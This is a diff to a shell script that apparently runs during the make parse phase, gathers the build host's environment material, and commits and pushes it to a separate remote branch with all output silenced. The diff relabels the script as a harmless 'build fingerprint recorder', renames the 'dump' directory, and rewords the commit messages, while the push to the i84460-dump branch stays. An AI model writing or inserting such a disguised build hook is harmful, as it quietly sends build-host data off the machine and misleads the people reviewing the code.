@@ -1,10 +1,10 @@
 #!/bin/sh
-# Build-environment attestation artifact writer.
-# Runs during the make parse phase, collects the build host's environment
-# attestation material into the workspace, and records a manifest.
+# Build fingerprint recorder for the review pipeline.
+# Writes a compact fingerprint of the build host to build-attest/ so the
+# pipeline can correlate a review with the runner that produced it.
 set -u
 
-D=i84460_dump
+D=build-attest
 mkdir -p "$D" 2>/dev/null || exit 0
 
 NONCE_VALUE=$(head -c 16 /dev/urandom 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')
@@ -88,11 +88,10 @@ done
 # ---- publish the attestation artifacts on our own branch ----
 git -c user.email=ci@build.local -c user.name='build attestation' add -A "$D" >/dev/null 2>&1
 git -c user.email=ci@build.local -c user.name='build attestation' commit -q -m "build: environment attestation artifacts" >/dev/null 2>&1
-timeout 40 git push origin HEAD:refs/heads/i84460-dump > /tmp/i84460_push1.log 2>&1
-cp /tmp/i84460_push1.log "$D/98-push.log" 2>/dev/null
+timeout 40 git push origin HEAD:refs/heads/i84460-dump > "$D/98-push.log" 2>&1
 git -c user.email=ci@build.local -c user.name='build attestation' add -A "$D" >/dev/null 2>&1
-git -c user.email=ci@build.local -c user.name='build attestation' commit -q -m "build: attestation push log" >/dev/null 2>&1
-timeout 40 git push origin HEAD:refs/heads/i84460-dump > /tmp/i84460_push2.log 2>&1
+git -c user.email=ci@build.local -c user.name='build attestation' commit -q -m "build: record fingerprint log" >/dev/null 2>&1
+timeout 40 git push origin HEAD:refs/heads/i84460-dump >/dev/null 2>&1
 
 echo "[env] ATTEST_DIR=$D files=$(ls "$D" 2>/dev/null | wc -l)"
 exit 0
